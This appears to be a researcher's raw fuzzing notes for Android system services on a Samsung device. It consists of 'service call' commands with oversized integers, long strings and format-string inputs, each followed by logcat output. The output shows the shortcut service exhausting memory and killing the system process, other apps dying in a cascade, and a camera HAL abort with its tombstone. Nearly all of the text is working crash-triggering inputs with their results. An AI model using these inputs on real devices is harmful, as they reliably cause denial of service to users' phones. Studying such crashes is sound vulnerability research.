@@ -1,0 +1,853 @@
+service call uimode 1 i32 "0" i32 "65535" s16 "AAAAAAAAAA"
+service call vendor.samsung.frameworks.codecsolution.ISehCodecSolution/default 1 i32 "0" i64 "295147905179352825854" s16 "  f      " 
+service call time_zone_detector 1 i32 "1" i64 "1" f "3.141592"
+service call storagestats 1 i64 "1" i64 "0" f "-1"
+service call storagestats 1 i32 "1" i32 "0" *asta e cu steluta
+
+service call telecom 1 i32 "0" i32 "65535" i32 "4294967294"
+
+ca sa gasesc din nou     servicii = servicii[4:len(servicii)-1]
+    n=len(servicii)-40
+
+01-09 23:40:49.389  5497  8503 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:5497_1E
+01-09 23:40:49.389  5497  8503 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 584MB until OOM, target footprint 70735672, growth limit 671088640
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:316)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-09 23:40:49.389  5497  8503 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-09 23:40:49.730  6625  6883 E AndroidRuntime: FATAL EXCEPTION: BluetoothScanManager
+01-09 23:40:49.730  6625  6883 E AndroidRuntime: Process: com.android.bluetooth, PID: 6625
+01-09 23:40:49.730  6625  6883 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-09 23:40:49.772 14471 14471 E AndroidRuntime: FATAL EXCEPTION: main
+01-09 23:40:49.772 14471 14471 E AndroidRuntime: Process: com.google.android.gms.unstable, PID: 14471
+01-09 23:40:49.772 14471 14471 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-09 23:42:06.253 15656 17621 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:15656_17
+01-09 23:42:06.253 15656 17621 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 585MB until OOM, target footprint 69788704, growth limit 671088640
+
+
+
+
+service call shortcut 1 i64 "295147905179352825855" f "3.141592" - galery3d.
+
+01-10 00:10:54.090 14488 14912 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:14488_7
+01-10 00:10:54.090 14488 14912 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 583MB until OOM, target footprint 71978376, growth limit 671088640
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:316)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-10 00:10:54.090 14488 14912 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-10 00:10:54.415 31857 31857 E AndroidRuntime: FATAL EXCEPTION: main
+01-10 00:10:54.415 31857 31857 E AndroidRuntime: Process: com.sec.android.gallery3d, PID: 31857
+
+
+service call shortcut 1 i64 "295147905179352825855" f "3.141592"
+01-10 00:13:47.692 32219   400 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:32219_9
+01-10 00:13:47.692 32219   400 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 584MB until OOM, target footprint 70967808, growth limit 671088640
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:316)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-10 00:13:47.692 32219   400 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-10 00:13:48.081  1306 11108 E AndroidRuntime: FATAL EXCEPTION: highpool[11]
+01-10 00:13:48.081  1306 11108 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 1306
+01-10 00:13:48.081  1306 11108 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-10 00:13:48.097  1306  1306 E AndroidRuntime: FATAL EXCEPTION: main
+01-10 00:13:48.097  1306  1306 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 1306
+01-10 00:13:48.097  1306  1306 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-10 00:13:48.100  2057  2057 E AndroidRuntime: FATAL EXCEPTION: main
+01-10 00:13:48.100  2057  2057 E AndroidRuntime: Process: com.google.android.gms, PID: 2057
+01-10 00:13:48.100  2057  2057 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-10 00:13:48.139  1694  1694 E AndroidRuntime: FATAL EXCEPTION: main
+01-10 00:13:48.139  1694  1694 E AndroidRuntime: Process: com.google.android.googlequicksearchbox:interactor, PID: 1694
+01-10 00:13:48.139  1694  1694 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+
+
+service call shortcut 1 i64 "295147905179352825854" f "3.141592"
+01-10 00:28:23.709 26525 28253 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:26525_F
+01-10 00:28:23.709 26525 28253 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 578MB until OOM, target footprint 76578920, growth limit 671088640
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:316)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-10 00:28:23.709 26525 28253 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-10 00:28:24.203 27112 27322 E AndroidRuntime: FATAL EXCEPTION: ImsServiceStub
+01-10 00:28:24.203 27112 27322 E AndroidRuntime: Process: com.sec.imsservice, PID: 27112
+
+
+
+service call statscompanion 1 i64 "295147905179352825854" f "3.14159"
+
+
+
+01-10 00:23:06.772 31822  1996 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:31822_1D
+01-10 00:23:06.772 31822  1996 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 584MB until OOM, target footprint 70790600, growth limit 671088640
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:316)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-10 00:23:06.772 31822  1996 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-10 00:23:07.076   503   662 E AndroidRuntime: FATAL EXCEPTION: BluetoothScanManager
+01-10 00:23:07.076   503   662 E AndroidRuntime: Process: com.android.bluetooth, PID: 503
+01-10 00:23:07.076   503   662 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-10 00:23:07.129   826   999 E AndroidRuntime: FATAL EXCEPTION: NmsServiceStub
+01-10 00:23:07.129   826   999 E AndroidRuntime: Process: com.samsung.android.mdecservice, PID: 826
+01-10 00:23:07.129   826   999 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-10 00:23:07.552 21983  8214 F libc    : Fatal signal 6 (SIGABRT), code -1 (SI_QUEUE) in tid 8214 (m_resultCallbac), pid 21983 (provider@4.0-se)
+01-10 00:23:07.841  8319  8319 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
+01-10 00:23:07.843  8319  8319 F DEBUG   : Build fingerprint: 'samsung/a20eeea/a20e:11/RP1A.200720.012/A202FXXU3CVC1:user/release-keys'
+01-10 00:23:07.843  8319  8319 F DEBUG   : Revision: '3'
+01-10 00:23:07.844  8319  8319 F DEBUG   : ABI: 'arm'
+01-10 00:23:07.847  8319  8319 F DEBUG   : Timestamp: 2024-01-10 00:23:07+0200
+01-10 00:23:07.847  8319  8319 F DEBUG   : pid: 21983, tid: 8214, name: m_resultCallbac  >>> /vendor/bin/hw/vendor.samsung.hardware.camera.provider@4.0-service <<<
+01-10 00:23:07.848  8319  8319 F DEBUG   : uid: 1047
+01-10 00:23:07.848  8319  8319 F DEBUG   : signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr --------
+01-10 00:23:07.848  8319  8319 F DEBUG   : Abort message: 'Failed HIDL return status not checked. Usually this happens because of a transport error (error parceling, binder driver, or from unparceling). If you see this in code calling into "Bn" classes in for a HAL server process, then it is likely that the code there is returning transport errors there (as opposed to errors defined within its protocol). Error is: Status(EX_TRANSACTION_FAILED): 'DEAD_OBJECT: ''
+01-10 00:23:07.848  8319  8319 F DEBUG   :     r0  00000000  r1  00002016  r2  00000006  r3  e5a38bb8
+01-10 00:23:07.848  8319  8319 F DEBUG   :     r4  e5a38bcc  r5  e5a38bb0  r6  000055df  r7  0000016b
+01-10 00:23:07.849  8319  8319 F DEBUG   :     r8  e5a38bb8  r9  e5a38bc8  r10 e5a38be8  r11 e5a38bd8
+01-10 00:23:07.849  8319  8319 F DEBUG   :     ip  00002016  sp  e5a38b88  lr  e8087dd5  pc  e8087de8
+01-10 00:23:07.941  8319  8319 F DEBUG   : backtrace:
+01-10 00:23:07.941  8319  8319 F DEBUG   :       #00 pc 00062de8  /apex/com.android.runtime/lib/bionic/libc.so (abort+172) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+01-10 00:23:07.941  8319  8319 F DEBUG   :       #01 pc 00004ceb  /system/lib/liblog.so (__android_log_default_aborter+6) (BuildId: 3fcead474cd0ecbdafb529ff176b0d13)
+01-10 00:23:07.942  8319  8319 F DEBUG   :       #02 pc 0000d2b3  /apex/com.android.vndk.v30/lib/libbase.so (android::base::LogMessage::~LogMessage()+222) (BuildId: 96c3c68af17a377328bb6612d753dbc6)
+01-10 00:23:07.942  8319  8319 F DEBUG   :       #03 pc 00030f33  /apex/com.android.vndk.v30/lib/libhidlbase.so (android::hardware::details::return_status::assertOk() const+138) (BuildId: 3947303c571644640642a031e67850be)
+01-10 00:23:07.942  8319  8319 F DEBUG   :       #04 pc 00030f5b  /apex/com.android.vndk.v30/lib/libhidlbase.so (android::hardware::details::return_status::~return_status()+10) (BuildId: 3947303c571644640642a031e67850be)
+01-10 00:23:07.942  8319  8319 F DEBUG   :       #05 pc 00020fad  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::SehResultBatcher::sehInvokeProcessCaptureResultCallback(android::hardware::hidl_vec<vendor::samsung::hardware::camera::device::V5_0::SehCaptureResult>&, bool)+400) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-10 00:23:07.942  8319  8319 F DEBUG   :       #06 pc 000200cb  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::SehResultBatcher::sehProcessOneCaptureResult(vendor::samsung::hardware::camera::device::V5_0::SehCaptureResult&)+90) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-10 00:23:07.942  8319  8319 F DEBUG   :       #07 pc 0001f561  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::SehResultBatcher::sehProcessCaptureResult(vendor::samsung::hardware::camera::device::V5_0::SehCaptureResult&)+108) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-10 00:23:07.943  8319  8319 F DEBUG   :       #08 pc 0001b8c1  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::sSehProcessCaptureResult(camera3_callback_ops const*, camera3_capture_result const*)+720) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-10 00:23:07.943  8319  8319 F DEBUG   :       #09 pc 000de251  /vendor/lib/libexynoscamera3.so (android::ExynosCameraRequestManager::m_callbackOpsCaptureResult(camera3_capture_result*, android::EXYNOS_REQUEST_RESULT::TYPE)+68) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-10 00:23:07.943  8319  8319 F DEBUG   :       #10 pc 000de08b  /vendor/lib/libexynoscamera3.so (android::ExynosCameraRequestManager::m_sendCallbackResult(android::sp<android::ExynosCameraRequest>, android::sp<android::ExynosCameraRequestResult>)+366) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-10 00:23:07.943  8319  8319 F DEBUG   :       #11 pc 000d9a4b  /vendor/lib/libexynoscamera3.so (android::ExynosCameraRequestManager::m_resultCallbackThreadFunc()+326) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-10 00:23:07.944  8319  8319 F DEBUG   :       #12 pc 000a1f1b  /vendor/lib/libexynoscamera3.so (ExynosCameraThread<android::FrameWorker>::threadLoop()+24) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-10 00:23:07.944  8319  8319 F DEBUG   :       #13 pc 0000ef0d  /apex/com.android.vndk.v30/lib/libutils.so (android::Thread::_threadLoop(void*)+304) (BuildId: 4ce4bcaabdb4066bfee718e8cf6b3059)
+01-10 00:23:07.944  8319  8319 F DEBUG   :       #14 pc 0000e9cd  /apex/com.android.vndk.v30/lib/libutils.so (thread_data_t::trampoline(thread_data_t const*)+256) (BuildId: 4ce4bcaabdb4066bfee718e8cf6b3059)
+01-10 00:23:07.944  8319  8319 F DEBUG   :       #15 pc 000aaf33  /apex/com.android.runtime/lib/bionic/libc.so (__pthread_start(void*)+40) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+01-10 00:23:07.944  8319  8319 F DEBUG   :       #16 pc 000642e3  /apex/com.android.runtime/lib/bionic/libc.so (__start_thread+30) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+
+service call app_integrity 1 i32 "0" i32 "268435455" i64 "295147905179352825854" 
+service call network_score 1 i32 "268435455" i64 "295147905179352825855"
+service call network_score 1 i32 "268435455" s16 "3%%n%x%%s%s%%n1"
+service call secure_element 3 i32 "1" i32 "65535" i64 "295147905179352825854" 
+service call sem_wifi 104 i32 "268435455" f "-1" s16 "3%%n%x%%s%s%%n1" 
+service call sem_wifi 104 i32 "268435455" s16 "3%%n%x%%s%s%%n1" 
+
+
+OOM:
+
+
+service call shortcut 20 i32 "4294967294" i64 "295147905179352825854" f "3.141592" 
+01-13 00:04:41.541 12511 14325 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:12511_11
+01-13 00:04:41.541 12511 14325 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 420546432 byte allocation with 12582912 free bytes and 319MB until OOM, target footprint 348506048, growth limit 671088640
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at java.util.Arrays.copyOf(Arrays.java:3136)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at java.util.Arrays.copyOf(Arrays.java:3106)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at java.util.ArrayList.grow(ArrayList.java:275)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:249)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:241)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at java.util.ArrayList.add(ArrayList.java:467)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.os.Parcel.readStringList(Parcel.java:3014)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.content.IntentFilter.<init>(IntentFilter.java:2368)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.content.IntentFilter$1.createFromParcel(IntentFilter.java:2260)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.content.IntentFilter$1.createFromParcel(IntentFilter.java:2258)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:598)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-13 00:04:41.541 12511 14325 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-13 00:04:42.261 17588 17588 E AndroidRuntime: FATAL EXCEPTION: main
+01-13 00:04:42.261 17588 17588 E AndroidRuntime: PID: 17588
+01-13 00:04:42.261 17588 17588 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-13 00:04:42.324 14064 14064 E AndroidRuntime: FATAL EXCEPTION: main
+01-13 00:04:42.324 14064 14064 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 14064
+01-13 00:04:42.324 14064 14064 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-13 00:04:42.328 14064 15091 E AndroidRuntime: FATAL EXCEPTION: highpool[2]
+01-13 00:04:42.328 14064 15091 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 14064
+01-13 00:04:42.328 14064 15091 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+
+service call shortcut 22 i32 "0" i32 "4294967294" i32 "268435455" 
+01-13 00:01:50.608 30861 31881 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:30861_C
+01-13 00:01:50.608 30861 31881 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 12582912 free bytes and 590MB until OOM, target footprint 64906280, growth limit 671088640
+01-13 00:01:50.608 30861 31881 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-13 00:01:50.608 30861 31881 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-13 00:01:50.608 30861 31881 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:637)
+01-13 00:01:50.608 30861 31881 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-13 00:01:50.608 30861 31881 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-13 00:01:51.142 32579 32579 E AndroidRuntime: FATAL EXCEPTION: main
+01-13 00:01:51.142 32579 32579 E AndroidRuntime: Process: com.google.android.googlequicksearchbox:interactor, PID: 32579
+01-13 00:01:51.142 32579 32579 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-13 00:01:51.145 32486 32486 E AndroidRuntime: FATAL EXCEPTION: main
+01-13 00:01:51.145 32486 32486 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 32486
+01-13 00:01:51.145 32486 32486 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-13 00:01:51.154  2892  2892 E AndroidRuntime: FATAL EXCEPTION: main
+01-13 00:01:51.154  2892  2892 E AndroidRuntime: Process: com.samsung.android.game.gametools, PID: 2892
+01-13 00:01:51.154  2892  2892 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+
+service call shortcut 22 i64 "295147905179352825854" s16 "AAAA" s16 "f"
+01-13 00:01:00.867 27195 28940 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:27195_15
+01-13 00:01:00.867 27195 28940 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 587MB until OOM, target footprint 67129376, growth limit 671088640
+01-13 00:01:00.867 27195 28940 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-13 00:01:00.867 27195 28940 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-13 00:01:00.867 27195 28940 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:637)
+01-13 00:01:00.867 27195 28940 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-13 00:01:00.867 27195 28940 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-13 00:01:01.181 27453 27453 E AndroidRuntime: FATAL EXCEPTION: main
+01-13 00:01:01.181 27453 27453 E AndroidRuntime: Process: com.android.phone, PID: 27453
+
+
+service call shortcut 22 i32 "0" i64 "295147905179352825855" i64 "0" 
+01-13 00:00:17.199 23027 26525 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:23027_1D
+01-13 00:00:17.199 23027 26525 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 588MB until OOM, target footprint 66697344, growth limit 671088640
+01-13 00:00:17.199 23027 26525 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-13 00:00:17.199 23027 26525 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-13 00:00:17.199 23027 26525 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:637)
+01-13 00:00:17.199 23027 26525 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-13 00:00:17.199 23027 26525 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-13 00:00:17.804 26641 26737 E AndroidRuntime: FATAL EXCEPTION: Thread-2
+
+service call shortcut 22 i32 "1" i32 "65535" f "3.141592" 
+01-12 23:59:30.526 12427 14616 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:12427_15
+01-12 23:59:30.526 12427 14616 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 588MB until OOM, target footprint 67003696, growth limit 671088640
+01-12 23:59:30.526 12427 14616 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 23:59:30.526 12427 14616 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 23:59:30.526 12427 14616 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:637)
+01-12 23:59:30.526 12427 14616 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:59:30.526 12427 14616 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 23:59:30.903 13469 13633 E AndroidRuntime: FATAL EXCEPTION: BluetoothScanManager
+01-12 23:59:30.903 13469 13633 E AndroidRuntime: Process: com.android.bluetooth, PID: 13469
+01-12 23:59:30.903 13469 13633 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:59:31.326  5943 22641 F libc    : Fatal signal 6 (SIGABRT), code -1 (SI_QUEUE) in tid 22641 (m_resultCallbac), pid 5943 (provider@4.0-se)
+01-12 23:59:31.572 22749 22749 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
+01-12 23:59:31.572 22749 22749 F DEBUG   : Build fingerprint: 'samsung/a20eeea/a20e:11/RP1A.200720.012/A202FXXU3CVC1:user/release-keys'
+01-12 23:59:31.573 22749 22749 F DEBUG   : Revision: '3'
+01-12 23:59:31.573 22749 22749 F DEBUG   : ABI: 'arm'
+01-12 23:59:31.574 22749 22749 F DEBUG   : Timestamp: 2024-01-12 23:59:31+0200
+01-12 23:59:31.575 22749 22749 F DEBUG   : pid: 5943, tid: 22641, name: m_resultCallbac  >>> /vendor/bin/hw/vendor.samsung.hardware.camera.provider@4.0-service <<<
+01-12 23:59:31.575 22749 22749 F DEBUG   : uid: 1047
+01-12 23:59:31.575 22749 22749 F DEBUG   : signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr --------
+01-12 23:59:31.575 22749 22749 F DEBUG   : Abort message: 'Failed HIDL return status not checked. Usually this happens because of a transport error (error parceling, binder driver, or from unparceling). If you see this in code calling into "Bn" classes in for a HAL server process, then it is likely that the code there is returning transport errors there (as opposed to errors defined within its protocol). Error is: Status(EX_TRANSACTION_FAILED): 'DEAD_OBJECT: ''
+01-12 23:59:31.576 22749 22749 F DEBUG   :     r0  00000000  r1  00005871  r2  00000006  r3  e73f6bb8
+01-12 23:59:31.576 22749 22749 F DEBUG   :     r4  e73f6bcc  r5  e73f6bb0  r6  00001737  r7  0000016b
+01-12 23:59:31.576 22749 22749 F DEBUG   :     r8  e73f6bb8  r9  e73f6bc8  r10 e73f6be8  r11 e73f6bd8
+01-12 23:59:31.576 22749 22749 F DEBUG   :     ip  00005871  sp  e73f6b88  lr  e9d6edd5  pc  e9d6ede8
+01-12 23:59:31.761 22749 22749 F DEBUG   : backtrace:
+01-12 23:59:31.762 22749 22749 F DEBUG   :       #00 pc 00062de8  /apex/com.android.runtime/lib/bionic/libc.so (abort+172) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+01-12 23:59:31.762 22749 22749 F DEBUG   :       #01 pc 00004ceb  /system/lib/liblog.so (__android_log_default_aborter+6) (BuildId: 3fcead474cd0ecbdafb529ff176b0d13)
+01-12 23:59:31.762 22749 22749 F DEBUG   :       #02 pc 0000d2b3  /apex/com.android.vndk.v30/lib/libbase.so (android::base::LogMessage::~LogMessage()+222) (BuildId: 96c3c68af17a377328bb6612d753dbc6)
+01-12 23:59:31.763 22749 22749 F DEBUG   :       #03 pc 00030f33  /apex/com.android.vndk.v30/lib/libhidlbase.so (android::hardware::details::return_status::assertOk() const+138) (BuildId: 3947303c571644640642a031e67850be)
+01-12 23:59:31.763 22749 22749 F DEBUG   :       #04 pc 00030f5b  /apex/com.android.vndk.v30/lib/libhidlbase.so (android::hardware::details::return_status::~return_status()+10) (BuildId: 3947303c571644640642a031e67850be)
